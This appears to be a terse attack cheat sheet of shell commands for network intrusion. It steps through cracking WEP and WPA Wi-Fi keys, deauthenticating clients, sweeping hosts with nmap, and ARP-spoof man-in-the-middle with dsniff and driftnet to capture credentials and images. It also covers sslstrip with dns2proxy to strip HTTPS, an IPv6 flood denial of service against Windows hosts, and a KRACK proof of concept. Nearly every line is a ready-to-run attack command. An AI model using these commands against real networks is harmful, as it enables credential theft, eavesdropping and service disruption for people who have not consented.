# 0x01: WEP
	# set adapter to monitor mode
	sudo airmon-ng start wlan0mon

	# view routers in range 4 recon    
	sudo airodump-ng wlan0mon

	# capture beacons from ssid in order to crack
	sudo airodump-ng --bssid 00:8B:5D:C1:46:2A -c 6 -w wep_crack.cap wlan0mon

	# aireplay to capture iv's for fast crack :) 
	sudo aireplay-ng -3 -b 00:8B:5D:C1:46:2A -h 4C:32:75:89:CA:DD wlan0mon

	# crack wep key with aircrack
	sudo aircrack-ng wep_crack.cap


# 0x02: WPA
	# set adapter to monitor mode
	sudo airmon-ng start wlan0mon

	# view routers in range 4 recon    
	sudo airodump-ng wlan0mon

	# capture packets from AP
	sudo airodump-ng --bssid 00:8B:5D:C1:46:2A -c 6 -w wpa_crack wlan0mon

	# deauth connected clients to capture handshake
	sudo aireplay-ng --deauth 100 -a 00:8B:5D:C1:46:2A wlan0mon

	# crack WPA key with dictionary
	sudo aircrack-ng wpa_crack.cap -w wordlist.txt


# 0x03: Host discovery once in the network
	# bash one line to nmap network and output alive hosts to text file
	sudo nmap -sn -n 10.0.0.0-255 | grep -E "(Host is up|10.0)" | awk '{print $5}' | grep '10' > livehosts.txt; cat alivehosts.txt


# 0x04: ARP Spoof for image sniffer + capture credentials over the network
	# two way arp spoof for mitm attack (client->router | router->client)
	sudo arpspoof -t 10.0.0.2 10.0.0.1
	sudo arpspoof -t 10.0.0.1 10.0.0.2

	# enable ip_forwarding in unix to allow packets to be send pack to victim
	sudo echo '1' > /proc/sys/net/ipv4/ip_forward

	# dsniff to sniff packets going over the network
	sudo dsniff

	# open driftnet to view images over the network
	sudo driftnet -i wlan0

# 0x05: SSLStrip2 & DNS2Proxy to MITM http(s) websites
	# download source code
	git clone https://github.com/moxie0/sslstrip.git && git clone https://github.com/LeonardoNve/dns2proxy.git

	# enable packet forwarding
	sudo echo '1' > /proc/sys/net/ipv4/ip_forward

	# configure IP tables for our attack
	sudo iptables --flush && sudo iptables --flush -t nat

	# set iptables rules to redirect http and dns traffic
	sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
	sudo iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT	--to-port 53

	# arpspoof router and target
	sudo arpspoof -t 10.0.0.2 10.0.0.1
	sudo arpspoof -t 10.0.0.1 10.0.0.2

	# start ssl strip on port 9000 (same port as iptables)
	sudo sslstrip -l 9000

	# start dns2proxy for dns redirection
	sudo python dns2proxy.py


# 0x06: IPv6 THC DoS (Windows hosts)
	# download thc-ipv6 toolkit
	sudo git clone https://github.com/vanhauser-thc/thc-ipv6.git

	# install package dependencies on host
	sudo apt-get install libpcap-dev libssl-dev libnetfilter-queue-dev

	# compile c code so we can execute binaries + install
	sudo make all && sudo make install

	# use exploit and pas
	sudo ./flood_router26 eth0 


# 0x07 KRACK PoC Demonstration
	# download krack src 
	sudo git clone https://github.com/Hackndo/krack-poc.git

	# Start krack attack 
	sudo python krack-ft-test.py wpa_supplicant -D nl80211 -i wlan1 -c wifi.conf

	# Generate Traffic
	sudo arping -i wlan1 192.168.1.254